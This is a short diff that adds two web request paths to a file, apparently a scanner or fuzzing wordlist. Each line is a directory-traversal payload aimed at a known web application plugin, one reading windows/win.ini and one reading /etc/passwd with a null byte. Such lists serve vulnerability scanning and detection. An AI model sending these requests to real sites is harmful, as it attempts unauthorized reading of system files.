@@ -1,0 +1,2 @@
+/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini
+/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00
